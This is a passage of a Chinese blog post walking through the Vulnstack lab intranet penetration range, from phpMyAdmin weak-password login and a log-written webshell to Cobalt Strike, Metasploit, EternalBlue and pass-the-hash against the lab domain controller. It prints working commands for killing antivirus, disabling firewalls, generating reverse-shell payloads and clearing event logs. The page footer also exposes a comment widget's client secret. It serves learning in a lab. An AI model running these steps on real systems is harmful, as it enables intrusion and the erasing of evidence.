+<li>Windows2008能够ping通内网其他两台主机但是无法ping通外部以及kali</li>
+<li>Windows2003同上</li>
+<li>kali能够与外界访问，能够ping通win7的NAT的ip，无法Ping通所有52网段内网ip</li>
+</ul>
+<h3 id="各主机的ip"><a href="#各主机的ip" class="headerlink" title="各主机的ip"></a>各主机的ip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">kali : 192.168.139.135<br>win7 : 192.168.139.136(NAT) 192.168.139.52.128<br>win08 : 192.168.52.138<br>win03 : 192.168.52.141<br></code></pre></td></tr></table></figure>
+
+<h3 id="启动web服务"><a href="#启动web服务" class="headerlink" title="启动web服务"></a>启动web服务</h3><p>win7的C盘下找到phpstudy并启动web服务：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413135637310.png"></p>
+<p>能够被外部访问：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413135705571.png"></p>
+<h2 id="外点getshell"><a href="#外点getshell" class="headerlink" title="外点getshell"></a>外点getshell</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>探针的页面下，MySQL弱口令存在root&#x2F;root，但是似乎是内网存在，外部无法连接上</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413140754720.png"></p>
+<p>扫目录下发现有phpMyAdmin后台以及phpinfo</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413140148443.png"></p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>phpmyadmin使用root&#x2F;root弱口令登录：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413142456689.png"></p>
+<p>有SQL执行处，很自然的就想到使用mysql写shell提权，先查一下权限：</p>
+<p><code>secure_file_priv</code>是null，看来into outfile&#96;和UDF提权都跪了</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413144818420.png"></p>
+<p>注意到系统为Windows，可以试试日志写webshell，依旧先查权限</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413145901762.png"></p>
+<p>从phpinfo中查到Web根目录<code>C:/phpStudy/WWW/</code>：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413150123333.png"></p>
+<p>开启日志并修改日志路径</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151043217.png"></p>
+<p>查询一句话木马</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151205358.png"></p>
+<p>成功连上蚁剑，拿到webshell：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413151446844.png"></p>
+<p>上了蚁剑之后才发现其实还有一个yxcms和beifen.rar，但是dirsearch没有扫出来，补充了一下字典</p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p>kali启动teamserver，配置好ip和密码</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413154409199.png"></p>
+<p>起个beacon http的监听器</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155127634.png"></p>
+<p>生成后门文件</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155326037.png"></p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155215071.png"></p>
+<p>把后门文件上传到靶机中：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155438578.png"></p>
+<p>执行cs.exe后成功上线CS</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155530667.png"></p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240413155547421.png"></p>
+<p>开始疯狂收集内网信息</p>
+<p>为了方便后续操作把会话派生到msf，先在msf配置好模块和payload，lhost以及端口等信息，开个反向连接</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013039780.png"></p>
+<p>在CS创建一个新的监听器，payload选<code>foreign http</code>，host填msf的服务ip，端口填msf的监听端口</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013821084.png"></p>
+<p>在CS会话选中新建会话</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417013633758.png"></p>
+<p>拿到meterpreter</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417014400666.png"></p>
+<p>检查是否为虚拟机，一般是用于检测蜜罐的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/windows/gather/checkvm<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418014301758.png"></p>
+<p>随手关杀软(靶场是没有的，但是实战中拿到shell第一件事就是关杀软)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/windows/manage/killav<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418014420485.png"></p>
+<p>扫了下机子，发现还是有非常多能利用的漏洞的，不过现在已经是管理员权限了就没必要提权了</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417014758506.png"></p>
+<p>在CS使用logonpasswords获取用户名密码，可在CS中开启RDP后远程桌面连接</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417020936451.png"></p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ipconfig /all				#查询当前网络情况(DNS，域等)<br>systeminfo				#查系统信息<br>net view                 # 查看局域网内其他主机名<br>net view /domain         # 查看有几个域<br>net user         # 查看本机用户名<br>net user /domain         # 查看域用户<br>net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net localgroup administrators # 查看本地管理员组（通常会有域用户）<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组<br>net group 组名 /domain    # 查看域中某工作组<br>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字<br>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;domain controllers&quot; /domain  # 查看域控制器主机名（可能有多台）<br></code></pre></td></tr></table></figure>
+
+<p>先执行<code>whoami</code>查看身份，发现是god域下的administrator权限</p>
+<p>执行<code>net config workstation</code>，发现存在域god</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417214812253.png"></p>
+<p>可能存在多个域，因此，接下来执行<code>net view /domain</code>，发现只有一个域GOD</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215120360.png"></p>
+<p><code>net view</code>查看一下域内一共有三台主机，</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417211334710.png"></p>
+<p>查看域下的分组</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215821470.png"></p>
+<p>直接<code>net group &quot;domain controllers&quot; /domain</code>查看域管理员</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240417215916553.png"></p>
+<p>至此域内关键信息所收集的差不多了，梳理一下</p>
+<p>存在一个域GOD，GOD域下有三台主机，<strong>域控是OWA主机</strong>，即<code>192.168.52.138</code>，win7主机内网ip为<code>192.168.52.143</code>，接下来就是要扫描内网主机了</p>
+<h3 id="msf拿下域控"><a href="#msf拿下域控" class="headerlink" title="msf拿下域控"></a>msf拿下域控</h3><p>先进行端口扫描，这里使用CS的portscan或者msf的<code>auxiliary/scanner/portscan/tcp</code> 模块</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418011259033.png"></p>
+<p>发现OWA主机开放了445、636、593等端口，</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418012944329.png"></p>
+<p>先用nmap粗略扫一下域控主机开放端口的可能存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nmap --script=vuln -p636,593,464,389,135,139,88,80,53,445 192.168.52.138<br></code></pre></td></tr></table></figure>
+
+<p>80端口存在ms15_034利用可能</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015040195.png"></p>
+<p>以及存在ms17_010利用可能</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015255794.png"></p>
+<h4 id="ms15-034"><a href="#ms15-034" class="headerlink" title="ms15_034"></a>ms15_034</h4><p>这时候就想看看80端口能不能利用一下？从内网拿内网webshell，再进行提权等也是可能的吧，域控是不出网的，win7没装curl，因此想验证CVE-2015-1635最便捷的办法就是在win7上做个端口转发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh interface portproxy add v4tov4 listenaddress=192.168.139.147 listenport=2222 connectaddress=192.168.52.138 connectport=80<br></code></pre></td></tr></table></figure>
+
+<p>然后在kali上做个漏洞验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl -v 192.168.139.147:2222 -H &quot;Host:irrelevant&quot; -H &quot;Range:bytes=0-18446744073709551615&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420015745707.png"></p>
+<p>msf上给出的关于ms15_034的利用只有两个，一个是dump内存数据的，一个是ddos的。获取内存的并没有获得数据。试了下ddos的</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420020755796.png"></p>
+<p>直接给干黑屏了hhhhh，</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240420020826903.png"></p>
+<p>也没拿到shell（叹气</p>
+<h4 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17_010"></a>ms17_010</h4><p>既然有ms17_010存在可能，那就掏出msf扫一波吧，在使用msf进行内网探测之前都需要做好路由配置，因为rhost配置是在msf而不是meterpreter中，对于攻击机kali来说无法访问到远程主机的内网ip，因此需要先使用内置模块做路由设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run post/multi/manage/autoroute				#自动添加内网路由到攻击机<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418021646274.png"></p>
+<p>既然开启了445端口，那必然要扫一波永恒之蓝的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">search ms17_010<br></code></pre></td></tr></table></figure>
+
+<p>先搜一波相关模块，前两个<code>exploit</code>的是攻击模块，后面两个<code>auxiliary</code>的是探测模块</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418022937256.png"></p>
+<p>这里使用最后一个模块来探测一波，我这里之前已经设置过相关配置了所以直接跳过，新的目标还是需要重新设置rhosts和ports。开扫，发现是有可能存在永恒之蓝利用的，Host is likely vulnerable to ms17_010~~~~</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418023114838.png"></p>
+<p>选攻击模块，开打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use 0		#数字0对应的是第一个攻击模块<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/bind_tcp		#由于目标不出网，因此需要正向连接<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.52.138<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 4445<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options<br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run<br></code></pre></td></tr></table></figure>
+
+<p>并没有成功，</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419032634232.png"></p>
+<p>关掉win7防火墙和Windows defender，以及手动关闭了域控的域内防火墙！</p>
+<p>(这里注意打开了win7防火墙之后执行<code>net view</code>等命令获取信息的时候可能会缺失win7主机的信息)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell netsh advfirewall set allprofiles state off<br>shell net stop windefend<br></code></pre></td></tr></table></figure>
+
+<p>以下是成功拿下域控shell：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419033136422.png"></p>
+<p>PS：用永恒之蓝打的时候很容易把域控打炸掉(shell没选对(选成反向shell)，lport没设置正确和本地端口冲突等，都会导致payload无效性地攻击域控导致域控GG)，倒是没有出现蓝屏的情况，就是异常卡顿，域控重启了好几次，cpu占用分分钟拉满</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419194239021.png"></p>
+<p>经测试，两台主机防火墙开启情况和攻击结果如下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>win7开</th>
+<th>win7关</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域控开</td>
+<td>失败</td>
+<td>失败</td>
+</tr>
+<tr>
+<td>域控关</td>
+<td>成功</td>
+<td>成功</td>
+</tr>
+</tbody></table>
+<p>显然能否攻击成功是和域控的防火墙有关了，</p>
+<p>但是假如一开始域控的防火墙就是开着的怎么办呢？</p>
+<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>前面端口扫描过的目标主机都会在Targets中显示：</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419202817777.png"></p>
+<p>在beacon执行<code>logonpasswords</code>来获取明文密码以及哈希凭据</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203057197.png"></p>
+<p>然后在Targets中选中目标主机右键，进行横移，方式选<code>psexec</code>攻击</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203311823.png"></p>
+<p>然后选一个刚刚得到的密码哈希或者明文，选择监听器和域内会话</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419204841662.png"></p>
+<p>监听器选beacon_bind_pipe</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419204901032.png"></p>
+<p>域控已上线</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419203726668.png"></p>
+<p>自己鼓捣的时候意外发现当域控防火墙关着的时候可以用正向tcp来直接横移</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419205021082.png"></p>
+<h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>拿到了域控的cs的会话，怎样派生到msf呢？可能第一反应会是反弹shell，但是怎么弹？已知域控是不出网的，只有域内的主机能够和域控会话，</p>
+<p>不过好在域内的win7主机是出网的，因此可以在win7做个端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netsh interface portproxy add v4tov4 listenaddress=192.168.52.143 listenport=5557 connectaddress=192.168.139.130 connectport=5556<br></code></pre></td></tr></table></figure>
+
+<p>然后设置一个foreign_http到win7的监听器，当win7收到请求就会将流量转发到目标机</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419213115556.png"></p>
+<p>再用msf_zhuanfa监听器新建一个会话，转发成功</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419213201854.png"></p>
+<h3 id="持久化和维权"><a href="#持久化和维权" class="headerlink" title="持久化和维权"></a>持久化和维权</h3><h3 id="清理痕迹"><a href="#清理痕迹" class="headerlink" title="清理痕迹"></a>清理痕迹</h3><p>win7</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wevtutil cl system 清除系统日志<br>wevtutil cl application 清除应用程序日志<br>wevtutil cl security 清除安全日志<br>netsh interface portproxy show all 查看转发的端口情况<br>netsh interface portproxy delete v4tov4 listenaddress=192.168.52.143 listenport=5557 清理转发的端口<br></code></pre></td></tr></table></figure>
+
+<p>msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">clearev  #清除事件日志<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h2><p>中间出了点事，回来的时候发现整个msf终端都崩了。。重新派生会话结果不知道怎么回事5556端口(msf接收cs的shell的端口)直接抽风，msf那边一run就自动连上，不知道咋回事的情况下试着监听了下5556端口，结果，请看VCR.jpg。。。</p>
+<p>不知道哪来的这么多的请求</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/37585dc61b7a057656f59d9a6508b0d3.png"></p>
+<p>开着监听在win7执行<code>netstat -ano | findstr :5556</code>，发现幕后真凶，</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418212831028.png"></p>
+<p>注意到是涉嫌进程后面有个*32，怀疑是msf的payload版本和win7的不同，然后指定了一下x64的payload，双手合十，虔诚祈祷。。</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418214555316.png"></p>
+<p>再次派生到msf试试</p>
+<p>噔噔咚</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240418214521355.png"></p>
+<p>好吧咱也不知道啥情况了，不过后者确实没有无限发包了(叹气)</p>
+<p>直接上msf马，简单，纯粹。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -a x86 -p windows/meterpreter/reverse_tcp lhost=192.168.139.135 lport=5556 -f exe -o /home/kali/Desktop/666.exe<br></code></pre></td></tr></table></figure>
+
+<p>事实上是也不行，32位64位全都试过，各种payload都试过了也都无济于事，靶机和msf全部重装都不行，如果有懂得的师傅请赐教</p>
+<p>重装kali解决(感觉只是msf的问题但是已经删除干净了却还是不行)</p>
+<p><img src="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(1)/image-20240419025706725.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一直说想学内网结果因为学业或者各种乱七八糟的事一鸽再鸽，现在终于能够静下心来好好学内网了。做了这个红日靶场第一关个人感觉收获颇丰，完完全全打开了一个新世界。参考了不少的文章，从环境搭建的一路坐牢，到CS和msf的使用一路各种摸爬滚打，域，工作目录，策略组。。各种概念一点一点从头开始学习，以及计算机网络的各种基础(没错，就是计网，一门被我咕咕了一整个学期的”水课”，主要是老师全都在念PPT，确实没啥意思)。总而言之算是收获很大了，之后还有很长的学习道路要走，碰到的各种问题也希望有经验的师傅能够赐教，个人邮箱：</p>
+<p>📫：<a href="mailto:&#x70;&#111;&#116;&#97;&#x74;&#x6f;&#119;&#111;&#50;&#51;&#x33;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;">&#x70;&#111;&#116;&#97;&#x74;&#x6f;&#119;&#111;&#50;&#51;&#x33;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#109;</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li>书籍：《内网渗透体系建设》</li>
+<li>环境搭建：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15302226/5189485">https://blog.51cto.com/u_15302226/5189485</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46635165/article/details/120682222">https://blog.csdn.net/qq_46635165/article/details/120682222</a></li>
+</ul>
+</div><div class="article-licensing box"><div class="licensing-title"><p>Vulnstack红日靶场(1)</p><p><a href="http://potatowo233.github.io/2024/04/13/Vulnstack红日靶场(1)/">http://potatowo233.github.io/2024/04/13/Vulnstack红日靶场(1)/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Potat0w0</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2024-04-13</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2024-05-06</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透 </a></div></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechatpay.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2024/04/13/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-2/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Vulnstack红日靶场(2)</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2024/04/12/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/"><span class="level-item">内网基础</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
+            id: "b8fe9d4c97c43f3516ccedf8e61c324d",
+            repo: "blog_comments",
+            owner: "Potatowo233",
+            clientID: "de106bfe6211fc3ceedc",
+            clientSecret: "2b3fe4ea85fc7d402cf3c84e18d1e9ae175f1e2d",
+            admin: ["Potatowo233"],
+            createIssueManually: false,
+            distractionFreeMode: false,
+            perPage: 20,
+            pagerDirection: "last",
+            
+            
+            enableHotKey: true,
+            language: "zh-CN",
+        })
+        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card is-hidden-mobile" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/head.jpg" alt="Potat0w0"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Potat0w0</p><p class="is-size-6 is-block">Nice t0 th3 Intern3t</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Fuzhou,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">48</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">22</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://space.bilibili.com/26346947" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Potatowo233"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/rss.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Vmware导入主机"><span class="level-left"><span class="level-item">Vmware导入主机</span></span></a></li><li><a class="level is-mobile" href="#环境搭建"><span class="level-left"><span class="level-item">环境搭建</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#网络配置"><span class="level-left"><span class="level-item">网络配置</span></span></a></li><li><a class="level is-mobile" href="#各主机的ip"><span class="level-left"><span 